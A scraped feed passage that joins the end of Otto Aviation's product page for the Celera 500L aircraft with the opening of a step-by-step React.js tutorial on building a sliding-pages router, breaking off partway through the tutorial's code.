          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502077265-12SO3F2QXZRAGESLWL69/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502077265-12SO3F2QXZRAGESLWL69/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/5.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="5.png" data-load="false" data-image-id="5f37f27d3466a3251476526d" data-type="image" src="https://www.ottoaviation.com/5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_67950"><p><h3>Range of a large cabin aircraft</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_74975"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502094055-EW3SX7P2Z5ZL3G41E1JU/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/6.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502094055-EW3SX7P2Z5ZL3G41E1JU/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/6.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="6.png" data-load="false" data-image-id="5f37f28e3466a3251476568c" data-type="image" src="https://www.ottoaviation.com/6.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_69516"><p><h3>Takeoff performance of a Midsize Jet</h3></p></div></div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-26" data-collection-id="5f36a1498160027894b3d5de" data-parallax-id="5f36a1498160027894b3d5de" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484229000" id="page-5f36a1498160027894b3d5de"><div><div><div data-block-type="2" id="block-c59e4bb877f1f21f0644"><div><h2>LOW DRAG MEANS HIGH EFFICIENCY.</h2><p>The Celera 500L is designed for transcontinental range with operating costs equal to or better than commercial airline ticket pricing on a per passenger basis. This criteria requires extremely low drag across the entire aircraft with a highly fuel efficient propulsion system. To achieve this, extensive use of laminar shapes was used for the wings, fuselage, and tail sections.  </p></div></div><div data-aspect-ratio="60" data-block-type="5" id="block-8c7f602662956732116d"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png" data-image-dimensions="1280x408" data-image-focal-point="0.5,0.5" alt="Window Rendering.png" data-load="false" data-image-id="5f3ec9a88316491b62724dd4" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-13" data-parallax-original-element="" data-collection-id="5f36ac4b4a9f8a16b45aacf5" data-parallax-id="5f36ac4b4a9f8a16b45aacf5" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484247296" id="page-5f36ac4b4a9f8a16b45aacf5"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_243977"><p><h3>THE 4,500 NAUTICAL MILE RANGE MEANS <br>THE CELERA 500L CAN SERVICE VIRTUALLY <br>ANY CITY PAIR IN THE U.S. WITHOUT REFUELING.</h3></p></div></div></div></div>
        </div>
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="IMG_1570 editedBANNERCG.png" data-load="false" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png">

            </figure>
          
        
      </section>

    

  

    

      <section id="new-page-58" data-parallax-original-element="" data-collection-id="5f36b0f412f21a60e314118f" data-parallax-id="5f36b0f412f21a60e314118f" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1597948602600" id="page-5f36b0f412f21a60e314118f"><div><div><div data-aspect-ratio="197.92746113989637" data-block-type="5" id="block-yui_3_17_2_1_1597512042385_217663"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597948578823-KYRYWUVCBKAJB8KBQWEX/ke17ZwdGBToddI8pDm48kO1J1nhEoAQzUoWk64THNulZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVEMlsEwFgJwtGRRrANS2aYUah82UiDQ_hVtRYkDgul7Ie87Nsj43NRAr6WuWZv5DKs/Project-timeline.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597948578823-KYRYWUVCBKAJB8KBQWEX/ke17ZwdGBToddI8pDm48kO1J1nhEoAQzUoWk64THNulZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVEMlsEwFgJwtGRRrANS2aYUah82UiDQ_hVtRYkDgul7Ie87Nsj43NRAr6WuWZv5DKs/Project-timeline.png" data-image-dimensions="386x554" data-image-focal-point="0.5,0.5" alt="Project-timeline.png" data-load="false" data-image-id="5f3ec2a27ed0c018c9339e54" data-type="image" src="https://www.ottoaviation.com/Project-timeline.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597420895742-4TY7XLGOCPCZQ4DPHDDC/ke17ZwdGBToddI8pDm48kCX-V5vw-8h9IBXN10-_8XN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k2HH6OEm6WCCYLibno-s8b4weTEWBRU0WHPO2pE1u2Ju0c04VQ6HZ7fTjtKQ38BuA/TimelineBkgpsd.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597420895742-4TY7XLGOCPCZQ4DPHDDC/ke17ZwdGBToddI8pDm48kCX-V5vw-8h9IBXN10-_8XN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k2HH6OEm6WCCYLibno-s8b4weTEWBRU0WHPO2pE1u2Ju0c04VQ6HZ7fTjtKQ38BuA/TimelineBkgpsd.png" data-image-dimensions="2500x1407" data-image-focal-point="0.5,0.5" alt="TimelineBkgpsd.png" data-load="false" src="https://www.ottoaviation.com/TimelineBkgpsd.png">

            </figure>
          
        
      </section>

    

  

  
    <nav>
      
    </nav>
            
          </main>

        </div>
      </div>

      


    </div></div>]]>
            </description>
            <link>https://www.ottoaviation.com/celera-500l</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577235</guid>
            <pubDate>Thu, 24 Sep 2020 10:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sliding Pages with React.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577233">thread link</a>) | @asafg6
<br/>
September 24, 2020 | https://www.turtle-techies.com/sliding-pages-with-react-js/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/sliding-pages-with-react-js/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        
        <h4>A step by step guide to writing your own sliding pages router</h4>
                <h6>
                    By Asaf Gur, Published 2018-07-03
                </h6>
    </p><div itemprop="articleBody"><h2 id="make-them-slide">Make Them Slide!</h2>
<p>The popular way to achieve routing in React is using <a href="https://github.com/ReactTraining/react-router" target="_blank">React Router v4</a>. React Router works great, but it doesn't make the pages slide. Of course, you can use a package like <a href="https://www.npmjs.com/package/react-router-page-transition" target="_blank">React Router Page Transition</a> to make that happen.<br>
We are not going to use either of that packages in this tutorial. Instead, we will roll our own and create a sliding pages router.<br>
This tutorial is for learning purposes, If you want to use the final code in production it would require some more work.<br>
The complete solution is on github and you can find it <a href="https://github.com/asafg6/react-sliding-pages" target="_blank">here</a></p>
<h2 id="prerequisites">Prerequisites</h2>
<p>You should be comfortable with HTML, Javascript, css and React.</p>
<h2 id="step-1---setup">Step 1 - Setup</h2>
<p>we'll use create-react-app. If you don't have React installed, <a href="https://reactjs.org/docs/add-react-to-a-new-app.html" target="_blank">install it</a>.</p>
<p>Let's create our new app:</p>
<div><pre><code data-lang="shell">$ create-react-app react-sliding-pages
</code></pre></div><p>Alright! First step complete!
Feel free to delete logo.svg, we won't be using it.  <br>
You can cd into the project's directory and run <strong>npm start</strong>, so you can watch your progress.</p>
<h2 id="step-2---creating-the-page-element">Step 2 - Creating The Page Element</h2>
<p>Create a new file called page.js under the src directory.</p>
<p><strong>page.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Page</span> <span>extends</span> <span>Component</span> {

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
    }


    <span>render</span>() {
        <span>return</span> (
            <span>&lt;</span><span>div</span> <span>style</span><span>=</span>{{
                <span>width</span><span>:</span> <span>'100vw'</span>, 
                <span>height</span><span>:</span> <span>'100%'</span>,
                <span>position</span><span>:</span> <span>'fixed'</span>,
                <span>top</span><span>:</span> <span>0</span>,
                <span>left</span><span>:</span> <span>0</span>,
                <span>transform</span><span>:</span> <span>'translateX('</span><span>+</span> <span>this</span>.<span>props</span>.<span>left</span> <span>+</span> <span>'px)'</span>,
                <span>animationTimingFunction</span><span>:</span> <span>'ease-in'</span>,
                <span>zIndex</span><span>:</span> <span>-</span><span>20</span>,
                <span>transition</span><span>:</span> <span>'transform .8s ease-in-out'</span>
            }}<span>&gt;</span>
                {<span>this</span>.<span>props</span>.<span>children</span>}
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );

    }

}

<span>export</span> <span>default</span> <span>Page</span>;


</code></pre></div><p>There's a few things to pay attention to in this component.<br>
First of all, this is a container component ‚Äî we use <strong>this.props.children</strong> to render all child components.<br>
The other two are in the css:<br>
The <strong>transformX</strong> property is determined by the <strong>left</strong> prop.<br>
The transition and <strong>animationTimingFunction</strong> controls the animation and makes the sliding happen.</p>
<p>Now that we have our page component, we should try to use it.</p>
<h2 id="step-3---sliding-the-page">Step 3 - Sliding The Page</h2>
<p>Let's take care of some crucial styling. Change the contents of App.css to this:</p>
<p><strong>App.css</strong></p>
<div><pre><code data-lang="css">
.<span>App</span> {
  <span>text-align</span>: <span>center</span>;
}

.<span>page</span> {
  <span>width</span>: <span>300</span><span>px</span>;
  <span>height</span>: <span>100</span><span>%</span>;
  <span>min-height</span>: <span>5</span><span>em</span>;
  <span>margin-right</span>: <span>auto</span>;
  <span>margin-left</span>: <span>auto</span>;
  <span>margin-top</span>: <span>5</span><span>em</span>;
  <span>padding</span>: <span>2</span><span>em</span>;
  <span>z-index</span>: <span>15000</span>;
}

</code></pre></div><p>Change the contents of App.js to:</p>
<p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;
<span>import</span> <span>'./App.css'</span>;
<span>import</span> <span>Page</span> <span>from</span> <span>'./page'</span>;

<span>class</span> <span>App</span> <span>extends</span> <span>Component</span> {

  <span>constructor</span>(<span>props</span>) {
    <span>super</span>(<span>props</span>);
    <span>this</span>.<span>state</span> <span>=</span> {<span>left</span><span>:</span> <span>0</span>}
  }


  <span>render</span> () {
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>'App'</span><span>&gt;</span>
        <span>&lt;</span><span>div</span><span>&gt;</span>
          <span>&lt;</span><span>input</span> <span>type</span><span>=</span><span>"text"</span> <span>onChange</span><span>=</span>{(<span>e</span>) =&gt; <span>this</span>.<span>setState</span>({<span>left</span><span>:</span> parseInt(<span>e</span>.<span>target</span>.<span>value</span>)})} <span>/</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        <span>&lt;</span><span>Page</span> <span>left</span><span>=</span>{<span>this</span>.<span>state</span>.<span>left</span>}<span>&gt;</span>
          <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>'page'</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
            <span>bla1</span>
          <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    )
  }
}

<span>export</span> <span>default</span> <span>App</span>

</code></pre></div><p>Play around with the input, try typing 1000 or -500 and see what happens. If everything went well, the page should slide across the screen.<br>
So what did we do here?<br>
We created a state variable called <strong>left</strong> and passed it to our page component. When the input changes, it triggers the <strong>setState</strong> method and changes the page's left property.<br>
That's nice, but it's only one page. We need an element that will wrap our page components and switch them.</p>
<h2 id="step-4---creating-the-nav-element">Step 4 - Creating The Nav Element</h2>
<p>This is the main part of our program and where the most logic is.
Let's create our Nav element in small parts.</p>
<p>We'll start with an empty component. Create a new file called nav.js under the src directory.<br>
<strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Nav</span> <span>extends</span> <span>Component</span> {

}

<span>export</span> <span>default</span> <span>Nav</span>;
</code></pre></div><p>The plan is to place the current page in the middle of the screen and hide the other pages on the sides of the screen. To achieve that, we'll need to know the screen width.
The <strong>left</strong> prop worked well before, so we'll use it here as well.</p>
<p>Let's create the constructor for the Nav component:</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">
...

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
        <span>this</span>.<span>width</span> <span>=</span> window.<span>innerWidth</span> <span>||</span> document.<span>documentElement</span>.<span>clientWidth</span> <span>||</span> document.<span>body</span>.<span>clientWidth</span>;
        <span>let</span> <span>left</span> <span>=</span> <span>props</span>.<span>children</span>.<span>map</span>(<span>o</span> =&gt; <span>this</span>.<span>width</span>);
        <span>if</span> (<span>left</span>.<span>length</span> <span>&gt;</span> <span>0</span> ) {
            <span>left</span>[<span>0</span>] <span>=</span> <span>0</span>;
        }
        <span>this</span>.<span>state</span> <span>=</span> {<span>page</span><span>:</span> <span>0</span>, <span>left</span><span>:</span> <span>left</span>};        
    }

...

</code></pre></div><p>We now have the screen's width in <strong>this.width</strong>, an array of integers that represents the pages‚Äô left property and a page that represents the current page number.</p>
<p>Now let's add the <strong>move</strong> method:</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>move</span>(<span>page</span>) {
        <span>const</span> <span>left</span> <span>=</span> <span>this</span>.<span>state</span>.<span>left</span>.<span>slice</span>();
        <span>if</span> (<span>page</span> <span>&gt;=</span> <span>left</span>.<span>length</span>) {
          <span>page</span> <span>=</span> <span>0</span>;
        }
        <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>0</span>; <span>i</span> <span>&lt;</span> <span>left</span>.<span>length</span>; <span>i</span><span>++</span> ) {
          <span>if</span> (<span>i</span> <span>&lt;</span> <span>page</span>) {
            <span>left</span>[<span>i</span>] <span>=</span> <span>-</span><span>this</span>.<span>width</span>;
          } <span>else</span> <span>if</span> (<span>i</span> <span>===</span> <span>page</span>) {
            <span>left</span>[<span>i</span>] <span>=</span> <span>0</span>;
          } <span>else</span> {
            <span>left</span>[<span>i</span>] <span>=</span> <span>this</span>.<span>width</span>;
          }
        }    
        <span>this</span>.<span>setState</span>({<span>left</span><span>:</span> <span>left</span>, <span>page</span><span>:</span> <span>page</span>})
      }
      
...
</code></pre></div><p>Take a moment to read the code and understand what it does.</p>
<p>Basically, the code iterates on a copy of the left array and sets each page's left location according to the page number.</p>
<p>Let's continue to the <strong>render</strong> method.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>render</span>() {
        <span>const</span> <span>pageElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>children</span>, (<span>page</span>, <span>idx</span>) =&gt;
            <span>React</span>.<span>cloneElement</span>(<span>page</span>, { <span>left</span><span>:</span> <span>this</span>.<span>state</span>.<span>left</span>[<span>idx</span>] })); 
        <span>return</span> (
            <span>&lt;</span><span>div</span><span>&gt;</span>
                {<span>pageElements</span>}
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );
    }

...
</code></pre></div><p>Here, we use <strong>React.Children.map</strong> to iterate over the page elements and add the left prop.</p>
<p>Now let's use our new Nav element in App.js.</p>
<p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;
<span>import</span> <span>'./App.css'</span>;
<span>import</span> <span>Page</span> <span>from</span> <span>'./page'</span>;
<span>import</span> <span>Nav</span> <span>from</span> <span>'./nav'</span>;

<span>class</span> <span>App</span> <span>extends</span> <span>Component</span> {

  <span>constructor</span>(<span>props</span>) {
    <span>super</span>(<span>props</span>);
  }



  <span>render</span>() {
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"App"</span><span>&gt;</span>
        <span>&lt;</span><span>Nav</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'red'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'blue'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'brown'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>N</span><span>a</span><span>v</span><span>&gt;</span>
        
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    );
  }
}

<span>export</span> <span>default</span> <span>App</span>;


</code></pre></div><p>In case everything worked well, you should see the first page rendered in your browser. You can check the html source (using the browser's dev tools) and see that all the child elements are indeed rendered.</p>
<p>Alright, so we have all the pages but no access to the <strong>move</strong> method. Let's add some buttons temporarily just to see that the slide works.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>render</span>() {
        <span>const</span> <span>pageElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>children</span>, (<span>page</span>, <span>idx</span>) =&gt;
            <span>React</span>.<span>cloneElement</span>(<span>page</span>, { <span>left</span><span>:</span> <span>this</span>.<span>state</span>.<span>left</span>[<span>idx</span>] })); 
        <span>const</span> <span>buttonElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>buttons</span>, (<span>button</span>, <span>idx</span>) =&gt; {
            <span>let</span> <span>newButton</span> <span>=</span> <span>React</span>.<span>cloneElement</span>(<span>button</span> , { <span>onClick</span><span>:</span> () =&gt; <span>this</span>.<span>move</span>(<span>idx</span>), ...<span>button</span>.<span>props</span>});
            <span>return</span> <span>newButton</span>;
        });
        <span>return</span> (
            <span>&lt;</span><span>div</span><span>&gt;</span>
                <span>&lt;</span><span>div</span><span>&gt;</span>
                    {<span>buttonElements</span>}
                <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
                <span>&lt;</span><span>div</span><span>&gt;</span>
                    {<span>pageElements</span>}
                <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );
    }

...
</code></pre></div><p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">...

  <span>render</span>() {
    <span>let</span> <span>buttons</span> <span>=</span> [];
    <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>0</span>; <span>i</span> <span>&lt;</span> <span>4</span>; <span>i</span><span>++</span>) {
      <span>let</span> <span>button</span> <span>=</span> <span>&lt;</span><span>button</span> <span>key</span><span>=</span>{<span>i</span>.<span>toString</span>()}<span>&gt;</span>{<span>i</span>}<span>&lt;</span><span>/</span><span>b</span><span>u</span><span>t</span><span>t</span><span>o</span><span>n</span><span>&gt;</span><span>;</span>
      <span>buttons</span>.<span>push</span>(<span>button</span>);
    }
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"App"</span><span>&gt;</span>
        <span>&lt;</span><span>Nav</span> <span>buttons</span><span>=</span>{<span>buttons</span>}<span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'red'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'blue'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'brown'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>N</span><span>a</span><span>v</span><span>&gt;</span>
        
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    );
  }

...
</code></pre></div><p>Try the buttons in your browser, the pages should slide.</p>
<p>Now that the basic functionality works, let's make our Nav element more router like.</p>
<h2 id="step-5---implement-routing">Step 5 - Implement Routing</h2>
<p>First, remove the buttons we used for testing. We don't need them.
With that out of the way, create a new file called link.js under the src directory.</p>
<p><strong>link.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Link</span> <span>extends</span> <span>Component</span> {

    <span>go</span>() {
        window.<span>location</span>.<span>hash</span> <span>=</span> <span>this</span>.<span>props</span>.<span>to</span>.<span>slice</span>(<span>1</span>);
    }

    <span>render</span>() {
        <span>return</span> (
            <span>&lt;</span><span>i</span> <span>onClick</span><span>=</span>{() =&gt; <span>this</span>.<span>go</span>()}<span>&gt;</span>
                {<span>this</span>.<span>props</span>.<span>children</span>}
            <span>&lt;</span><span>/</span><span>i</span><span>&gt;</span>

        );
    }

}

